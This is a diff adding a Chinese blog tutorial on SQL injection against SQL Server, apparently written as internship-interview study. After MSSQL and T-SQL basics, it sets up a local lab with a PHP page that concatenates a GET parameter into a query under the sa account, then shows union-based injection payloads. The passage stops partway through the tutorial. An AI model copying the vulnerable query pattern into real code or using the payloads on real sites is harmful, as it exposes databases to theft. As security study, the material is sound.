@@ -153,7 +153,7 @@
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-count">3</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
@@ -175,6 +175,371 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://curlysean.github.io/2025/07/09/%E5%9F%BA%E4%BA%8ESqlServer%E7%9A%84SQL%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Sean">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="肖恩的博客">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | 肖恩的博客">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/07/09/%E5%9F%BA%E4%BA%8ESqlServer%E7%9A%84SQL%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">基于SqlServer的SQL注入</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-07-09 20:27:27 / 修改时间：20:27:41" itemprop="dateCreated datePublished" datetime="2025-07-09T20:27:27+08:00">2025-07-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="Ie5J5">基于SqlServer的SQL注入</h1>
+<h2 id="YBV7G">前言</h2>
+最近面试了几家实习，都问了基于SqlServer的SQL注入，所以今天想补一下基础。
+
+<h2 id="o2JTT">SqlServer搭建</h2>
+搭建SqlServer，我们的环境和版本如下：
+
+<ul>
+<li>Windows Server 2012</li>
+<li>SqlServer 2012</li>
+</ul>
+<p>这里的SqlServer环境搭建比较简单，可以参考该链接进行安装 <a target="_blank" rel="noopener" href="https://blog.csdn.net/gengkui9897/article/details/89301494">https://blog.csdn.net/gengkui9897/article/details/89301494</a></p>
+<h2 id="vucaF">SqlServer基础</h2>
+Microsoft SQL Server（微软结构化查询语言服务器）也叫Mssql，它是一个数据库平台，提供数据库的从服务器到终端的完整的解决方案，其中数据库服务器部分，是一个数据库管理系统，用于建立、使用和维护数据库。属关系型数据库。默认端口号为1433。
+
+<h3 id="ZNxWD">默认数据库</h3>
+安装好SqlServer后，SqlServer数据库中会有6个默认的库，用于维护系统正常运行的**系统数据库**，其中包括四个系统数据库：`master 、model 、msdb 、tempdb` ，和两个实例数据库：`ReportServer、ReportServerTempDB`
+
+<h4 id="kL0Os">系统数据库：</h4>
++ **master：**记录了SqlServer实例的所有系统级消息，包括实例范围的元数据（如登录账号、端点、链接服务器和系统配置设置）
++ msdb：供SqlServer代理服务调度报警和作业记录操作员的使用，保存关于调度报警、作业、操作员等信息
++ model：SqlServer实例上创建的所有数据库的模板
++ tempdb：临时数据库，用于保存临时对象或中间结果集，为数据库的排列等操作提供一个临时的工作空间
+
+<h4 id="qWTUS">实例数据库：</h4>
++ ReportServer：存储SSRS配置部分，报告定义，报告元数据，报告历史，缓存政策，快照，资源，安全设置，加密的数据，调度和提交数据，以及扩展信息
++ ReportServerTempDB：存储中间处理产品，例如缓冲的报告、会话和执行数据等
+
+<h3 id="VGws7">数据库的组成</h3>
+在SqlServer中，数据库是以文件的形式存在的，由文件和文件组组成
+
+<h4 id="cgnEs">文件</h4>
+数据库中的文件基本是分为以下三类：
+
+<ul>
+<li>主要数据文件：存放数据和数据库的初始化信息。每个数据库有且只能有一个主要数据文件<code>.mdf</code>结尾</li>
+<li>次要数据文件：存放除了主要数据文件以外的所有数据文件。次要数据文件不是必须的，可以没有，也可以有多个<code>.ndf</code>结尾</li>
+<li>事务日志文件：存放用户回复数据库的所有文件信息。每个数据库至少有一个日志文件，也可以有多个<code>.ldf</code>结尾</li>
+</ul>
+<h4 id="Eo4Ms">文件组</h4>
+文件组是数据库文件一种逻辑管理单位，他将数据库文件分成不同的文件组，方便对文件的分配和管理，分为两种类型：
+
+<ul>
+<li>主文件组Primary：主要是数据文件和没有明确指派给其他文件组的文件</li>
+<li>用户自定义的文件组：Create DataBase 或者 Alter DataBase语句，FileGroup关键字指定的文件组</li>
+</ul>
+<h4 id="x8Cvj">设计原则</h4>
+SqlServer数据库的设计原则如下
+
+<ul>
+<li>文件只能是一个文件组的成员</li>
+<li>文件或文件组不能由多个数据库使用</li>
+<li>日志不能作为文件组的一部分</li>
+</ul>
+<h3 id="Cm4QN">SqlServer权限</h3>
+sqlserver中的权限控制被分成服务器和数据库两个级别，一个服务器可以包含多个数据库。服务器级别权限可以让我们控制登录、服务器资源操作等等；数据库级别的权限可以让我们对具体的表\视图\数据等数据库内资源进行操作。
+
+<p>在SQL注入的漏洞挖掘中，我们关注的是sqlserver服务器级别的权限，可以把权限简单的归为以下三类：</p>
+<ul>
+<li>**sa权限：**即服务器角色sysadmin。拥有数据库操作，文件管理，命令执行，注册表读取等权限。SQLServer数据库的最高权限 </li>
+<li>**db权限：**文件管理，数据库操作等权限 users-administrators </li>
+<li>**public权限：**数据库操作 guest-users</li>
+</ul>
+<p>如果我们找到一个SqlServer数据库的注入点，可以通过以下命令判断当前用户的权限，查询语句返回1，说明是对应的权限。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">--判断是否是SA权限</span><br><span class="line">select <span class="title function_">is_srvrolemember</span><span class="params">(<span class="string">&#x27;sysadmin&#x27;</span>)</span>     </span><br><span class="line">--判断是否是db_owner权限  </span><br><span class="line">select <span class="title function_">is_member</span><span class="params">(<span class="string">&#x27;db_owner&#x27;</span>)</span></span><br><span class="line">--判断是否是<span class="keyword">public</span>权限</span><br><span class="line">select <span class="title function_">is_srvrolemember</span><span class="params">(<span class="string">&#x27;public&#x27;</span>)</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="ybo2c">T-SQL语言</h2>
+在mysql数据库中使用sql语句对数据库进行操作，而在sqlserver数据库中使用的是Transaction-SQL语言，简称T-SQL。T-SQL是在SQL基础之上的一种数据库编程语言。
+
+<p>在这篇文章中，我们基于增删改查和创建数据库去简单了解T-SQL语言</p>
+<h3 id="dfWqj">创建数据库</h3>
+用T-SQL去创建名为SQLDB的数据库，语句如下
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE SQLDB;</span><br></pre></td></tr></table></figure>
+
+<p>如果希望对数据库的文件路径、大小、增长方式等进行配置，可以使用以下命令</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE SQLDB</span><br><span class="line">ON <span class="title function_">PRIMARY</span> <span class="params">(</span></span><br><span class="line"><span class="params">    NAME = SQLDB_data,</span></span><br><span class="line"><span class="params">    FILENAME = <span class="string">&#x27;C:\MSSQL\DATA\SQLDB_data.mdf&#x27;</span>,</span></span><br><span class="line"><span class="params">    SIZE = 10MB,</span></span><br><span class="line"><span class="params">    MAXSIZE = 100MB,</span></span><br><span class="line"><span class="params">    FILEGROWTH = 5MB</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">LOG <span class="title function_">ON</span> <span class="params">(</span></span><br><span class="line"><span class="params">    NAME = SQLDB_log,</span></span><br><span class="line"><span class="params">    FILENAME = <span class="string">&#x27;C:\MSSQL\DATA\SQLDB_log.ldf&#x27;</span>,</span></span><br><span class="line"><span class="params">    SIZE = 5MB,</span></span><br><span class="line"><span class="params">    MAXSIZE = 50MB,</span></span><br><span class="line"><span class="params">    FILEGROWTH = 5MB</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749273823298-089e8d08-ccaa-49dc-82f8-17a60af1f3bc.png"></p>
+<h3 id="waUGu">创建表</h3>
+用T-SQL在SQLDB中新建表，新建表的时候要同时指明字段信息
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-- 切换到 SQLDB 数据库</span><br><span class="line">USE SQLDB;</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">-- 创建一个名为 Employees 的表</span><br><span class="line">CREATE TABLE <span class="title function_">Employees</span> <span class="params">(</span></span><br><span class="line"><span class="params">    EmployeeID INT PRIMARY KEY IDENTITY(<span class="number">1</span>,<span class="number">1</span>)</span>,  -- 员工ID，主键，自增</span><br><span class="line">    FirstName <span class="title function_">NVARCHAR</span><span class="params">(<span class="number">50</span>)</span> NOT NULL,           -- 名，最大<span class="number">50</span>字符，不能为空</span><br><span class="line">    LastName <span class="title function_">NVARCHAR</span><span class="params">(<span class="number">50</span>)</span> NOT NULL,            -- 姓，最大<span class="number">50</span>字符，不能为空</span><br><span class="line">    BirthDate DATE NULL,                       -- 出生日期，可以为空</span><br><span class="line">    HireDate DATE NOT NULL,                    -- 入职日期，不能为空</span><br><span class="line">    Email <span class="title function_">NVARCHAR</span><span class="params">(<span class="number">100</span>)</span> UNIQUE,                -- 邮箱，唯一约束，可为空</span><br><span class="line">    Salary <span class="title function_">DECIMAL</span><span class="params">(<span class="number">10</span>, <span class="number">2</span>)</span> CHECK (Salary &gt;= <span class="number">0</span>)  -- 工资，保留两位小数，必须为非负数</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274154500-0fbfc9ac-df90-4df4-a735-d3905eef6611.png"></p>
+<h3 id="bGBmK">增删改查</h3>
+<h4 id="Ece5h">插入数据</h4>
+使用Insert向该表中插入数据，可以使用以下命令：
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-- 切换到 SQLDB 数据库</span><br><span class="line">USE SQLDB;</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">-- 向 Employees 表插入一条记录（不包括自增主键 EmployeeID）</span><br><span class="line">INSERT INTO <span class="title function_">Employees</span> <span class="params">(FirstName, LastName, BirthDate, HireDate, Email, Salary)</span></span><br><span class="line">VALUES (</span><br><span class="line">    <span class="string">&#x27;John&#x27;</span>,                -- FirstName</span><br><span class="line">    <span class="string">&#x27;Doe&#x27;</span>,                 -- LastName</span><br><span class="line">    <span class="string">&#x27;1985-06-15&#x27;</span>,          -- BirthDate</span><br><span class="line">    <span class="string">&#x27;2020-01-10&#x27;</span>,          -- HireDate</span><br><span class="line">    <span class="string">&#x27;john.doe@example.com&#x27;</span>,-- Email</span><br><span class="line">    <span class="number">5500.00</span>                -- Salary</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274430512-4d8c38c1-16bd-419b-9239-7e71cb1cf558.png"></p>
+<h4 id="TGGaN">删除数据</h4>
+使用DELETE删除名为John Doe的员工，命令如下
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-- 删除名为 John Doe 的员工</span><br><span class="line">DELETE FROM Employees</span><br><span class="line"><span class="type">WHERE</span> <span class="variable">FirstName</span> <span class="operator">=</span> <span class="string">&#x27;John&#x27;</span> <span class="type">AND</span> <span class="variable">LastName</span> <span class="operator">=</span> <span class="string">&#x27;Doe&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274538213-7a61e8f0-f9b1-42fa-980e-0d0034267d3e.png"></p>
+<h4 id="Xbebe">修改数据</h4>
+修改名为Sean Doe的员工的薪资，修改为`6000.00`
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-- 修改名为 Sean Doe 的员工薪资为 <span class="number">6000.00</span></span><br><span class="line">UPDATE Employees</span><br><span class="line"><span class="type">SET</span> <span class="variable">Salary</span> <span class="operator">=</span> <span class="number">6000.00</span></span><br><span class="line"><span class="type">WHERE</span> <span class="variable">FirstName</span> <span class="operator">=</span> <span class="string">&#x27;Sean&#x27;</span> <span class="type">AND</span> <span class="variable">LastName</span> <span class="operator">=</span> <span class="string">&#x27;Doe&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274637417-9a73bfad-551d-49c6-a02a-9ea4a55cfd8d.png"></p>
+<h4 id="egPq9">查询数据</h4>
+查询数据的所使用的语句基本结构如下
+
+<p>后续进行SQL注入时，使用查询语句的频率最高</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT &lt;列名<span class="number">1</span>&gt;, &lt;列名<span class="number">2</span>&gt;, ...</span><br><span class="line">FROM &lt;表名&gt;</span><br><span class="line">[WHERE &lt;筛选条件&gt;]</span><br><span class="line">[GROUP BY &lt;分组列&gt;]</span><br><span class="line">[HAVING &lt;分组后的筛选条件&gt;]</span><br><span class="line">[ORDER BY &lt;排序列&gt; [ASC|DESC]];</span><br></pre></td></tr></table></figure>
+
+<p>这里我们举个例子，可以使用以下 T-SQL 语句来查询名为 Sean Doe 的员工的邮箱和薪资信息</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT Email, Salary</span><br><span class="line">FROM Employees</span><br><span class="line"><span class="type">WHERE</span> <span class="variable">FirstName</span> <span class="operator">=</span> <span class="string">&#x27;Sean&#x27;</span> <span class="type">AND</span> <span class="variable">LastName</span> <span class="operator">=</span> <span class="string">&#x27;Doe&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274859375-1b2cfc38-dada-475c-9c7a-56c66ee3b16c.png"></p>
+<h2 id="X0Ppb">SqlServer手工注入</h2>
+MSSQL注入攻击是最为复杂的数据库攻击技术，由于该数据库的功能十分强大，存储过程以及函数语句十分丰富，这些灵活的语句造就了新颖的攻击思路。
+
+<p>对于MSSQL注入点，我们往往最关心的是这个注入点的权限问题，上面讲过，对于MSSQL有以下三个权限：</p>
+<ol>
+<li>sa（最高权限 System）</li>
+<li>db（文件管理、数据库操作等等 user-administrator）</li>
+<li>public（数据库操作权限 guest-users）</li>
+</ol>
+<p>常见搭配为：asp&#x2F;aspx + sqlserver</p>
+<h3 id="qdFxg">环境搭建</h3>
+实验环境：
+
+<ul>
+<li>SqlServer 2012</li>
+<li>phpstudy 2018</li>
+<li>php7.3.4</li>
+</ul>
+<p>首先在数据库中创建数据库，创建数据表和插入输入等操作</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">-- 第一步：创建数据库</span><br><span class="line">USE master;</span><br><span class="line">GO</span><br><span class="line">CREATE DATABASE SchoolDB;</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">-- 第二步：切换到该数据库</span><br><span class="line">USE SchoolDB;</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">-- 第三步：创建学生表</span><br><span class="line">CREATE TABLE <span class="title function_">Students</span> <span class="params">(</span></span><br><span class="line"><span class="params">    StudentID INT PRIMARY KEY NOT NULL,         -- 学号，主键</span></span><br><span class="line"><span class="params">    StudentName NVARCHAR(<span class="number">50</span>)</span> NOT NULL,          -- 姓名</span><br><span class="line">    Age INT NOT NULL,                           -- 年龄</span><br><span class="line">    Class <span class="title function_">NVARCHAR</span><span class="params">(<span class="number">50</span>)</span> NOT NULL                 -- 所在班级</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">-- 第四步：插入示例学生数据</span><br><span class="line">INSERT INTO <span class="title function_">Students</span> <span class="params">(StudentID, StudentName, Age, Class)</span></span><br><span class="line">VALUES</span><br><span class="line">    (<span class="number">101</span>, <span class="string">&#x27;张三&#x27;</span>, <span class="number">16</span>, <span class="string">&#x27;高一1班&#x27;</span>),</span><br><span class="line">    (<span class="number">102</span>, <span class="string">&#x27;李四&#x27;</span>, <span class="number">17</span>, <span class="string">&#x27;高一2班&#x27;</span>),</span><br><span class="line">    (<span class="number">103</span>, <span class="string">&#x27;王五&#x27;</span>, <span class="number">16</span>, <span class="string">&#x27;高一1班&#x27;</span>);</span><br><span class="line">GO</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>需要在phpstudy中添加sqlsrv扩展，下载链接<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/sql/connect/php/release-notes-php-sql-driver?view=sql-server-ver15#previous-releases">https://learn.microsoft.com/en-us/sql/connect/php/release-notes-php-sql-driver?view=sql-server-ver15#previous-releases</a></p>
+<p>因为我这里是php7.3.4版本，我们需要将这两个文件放到<code>C:\phpstudy_pro\Extensions\php\php7.3.4nts\ext</code>目录下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749278764229-24daed4b-4130-40f2-ba42-c3e5aa3a7181.png"></p>
+<p>并在php.ini文件中添加这两行配置</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">extension=php_sqlsrv_63_nts.dll</span><br><span class="line">extension=php_pdo_sqlsrv_73_nts.dll</span><br></pre></td></tr></table></figure>
+
+<p>进入phpinfo界面后，可以看到我们的sqlsrv扩展就已经配置好了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749279018263-2dfcd35e-23eb-4c24-8a63-ec895ad57e94.png"></p>
+<p>除此之外，还需要去安装ODBC Driver，链接如下（64位电脑安装64位驱动即可）</p>
+<p><a target="_blank" rel="noopener" href="https://files.cnblogs.com/files/wtcl/sqlserverodbc.zip">https://files.cnblogs.com/files/wtcl/sqlserverodbc.zip</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749279529839-7ee6566a-38e7-4727-87db-72943da5821a.png"></p>
+<p>在网站目录下，创建一个进行sql查询的php文件，源码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">header</span><span class="params">(<span class="string">&quot;Content-Type:text/html;charset=gbk&quot;</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数据库连接</span></span><br><span class="line">$conn = sqlsrv_connect(<span class="string">&#x27;127.0.0.1&#x27;</span>, array(</span><br><span class="line">    <span class="string">&#x27;Database&#x27;</span> =&gt; <span class="string">&#x27;SchoolDB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;UID&#x27;</span> =&gt; <span class="string">&#x27;sa&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;PWD&#x27;</span> =&gt; <span class="string">&#x27;@sql123&#x27;</span></span><br><span class="line">));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 连接失败时输出错误</span></span><br><span class="line"><span class="keyword">if</span> ($conn === <span class="literal">false</span>) &#123;</span><br><span class="line">    var_dump(sqlsrv_errors());</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 GET 参数 id（注意：这是一个注入测试场景）</span></span><br><span class="line">$id = $_GET[<span class="string">&quot;id&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 拼接 SQL 语句</span></span><br><span class="line">$sql = <span class="string">&quot;SELECT * FROM Students WHERE StudentID = $id&quot;</span>;</span><br><span class="line">echo <span class="string">&quot;SQL Server injection exercise!&lt;br/&gt;&lt;br/&gt;&quot;</span>;</span><br><span class="line">echo <span class="string">&quot;sql: &quot;</span> . $sql . <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行查询</span></span><br><span class="line">$result = sqlsrv_query($conn, $sql);</span><br><span class="line">var_dump(sqlsrv_errors());</span><br><span class="line">echo <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结果</span></span><br><span class="line"><span class="keyword">if</span> ($re = sqlsrv_fetch_array($result, SQLSRV_FETCH_ASSOC)) &#123;</span><br><span class="line">    echo <span class="string">&quot;学号：&quot;</span> . $re[<span class="string">&#x27;StudentID&#x27;</span>] . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    echo <span class="string">&quot;姓名：&quot;</span> . $re[<span class="string">&#x27;StudentName&#x27;</span>] . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    echo <span class="string">&quot;年龄：&quot;</span> . $re[<span class="string">&#x27;Age&#x27;</span>] . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    echo <span class="string">&quot;班级：&quot;</span> . $re[<span class="string">&#x27;Class&#x27;</span>] . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    echo <span class="string">&quot;未找到该学生。&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这样环境就配置好了，访问<code>http://192.168.41.131:8080/SqlServer.php?id=101</code><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749279598408-007810b0-f16a-426a-a2e3-8b8b832a4047.png"></p>
+<h3 id="lZpDf">常见注入函数和关键字</h3>
+以下是在SQL注入中常用的函数与关键字
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//TOP 对标与MSSQL中的limit，想要输出一条信息 TOP 1 ，输出两条 TOP 2</span><br><span class="line">SELECT TOP 2 StudentName FROM STUDENTS</span><br><span class="line">//@@version 获取版本信息</span><br><span class="line">SELECT @@version</span><br><span class="line">//db_name 获取数据的名字</span><br><span class="line">SELECT db_name()</span><br><span class="line">//OBEJCT_ID 获取表对象ID</span><br><span class="line">OBJECT_ID(&#x27;表名&#x27;)</span><br><span class="line">//col_name table_id表对象ID column_id 列的序号 </span><br><span class="line">COL_NAME ( table_id , column_id )</span><br><span class="line">//convert 把日期转换成新数据类型的通用函数</span><br><span class="line">CONVERT(data_type(length),data_to_be_converted,style)</span><br><span class="line">//stuff 删除字符串中的一部分内容，用另一个字符串替代</span><br><span class="line">stuff( character_expression , start , length , replaceWith_expression )</span><br><span class="line">//len 返回目标字符串的长度</span><br><span class="line">len(select db_name())</span><br><span class="line">//SUBSTRING 用于从字符串中提取指定位置的一部分</span><br><span class="line">SUBSTRING(expression, start, length)</span><br></pre></td></tr></table></figure>
+
+<h3 id="HZao5">注入手法</h3>
+注入手法总的来说和Mysql差不多，差别在于一些函数的区别
+
+<h4 id="JU1ft">联合查询</h4>
+在MSSQL数据库中会存在一个系统自带库-->master，每个库都存在一个系统自带表-->sysobjects。该系统表中对于我们来说有三个字段有用：
+
+<ul>
+<li>NAME：表名信息</li>
+<li>XTYPE： 代表 表的类型，S代表系统自带表，U代表用户创建表</li>
+<li>ID：用于连接syscolumns表</li>
+</ul>
+<p>首先判断目标数据库是否是MSSQL数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=101 and exists(select * from sysobjects) --+</span><br></pre></td></tr></table></figure>
+
+<p>返回正常说明网站使用的数据库是MSSQL</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749280514056-1d5ed736-6607-41e8-b4c8-be5316676472.png"></p>
+<p>联合注入中必要的一步就是判断字段长度，当<code>order by 4</code>回显正常，但<code>order by 5</code>报错时，表明字段长度是3</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=101 order by 4 --+  正常</span><br><span class="line">SqlServer.php?id=101 order by 5 --+  报错</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749280632611-aafdf99b-293c-4352-97d7-583c58c60f86.png"></p>
+<p>接下来就是寻找字符串的回显位置（前面select语句查询为空时，才会回显联合查询的东西）</p>
+<p>可以看到，四个回显位均可以利用（正常渗透中，回显位不固定）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=0 union select 1,2,3,4 --+ </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749280830221-499a2f79-e52b-47bd-8bbe-0af4df071a1b.png"></p>
+<p>查询当前数据库的版本信息和名字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=0 union select 1,db_name(),3,@@version --+ </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749281119355-7d4fd5ba-02ed-464c-a318-52ceeebc0ab0.png"></p>
+<blockquote>
+<p>此处需要注意，当联合注入的数据和前半部分的数据类型不匹配时，会出现报错</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749281211809-ec2880ea-f667-478d-8c18-5232593c7e66.png"></p>
+</blockquote>
+<p>查询表名，将获取到的数据库名和<code>.dbo.sysobjects</code>进行拼接，通过限制<code>xtype</code>为u，使用<code>TOP 1</code>进行限制，找出第一条查询到的用户创建表</p>
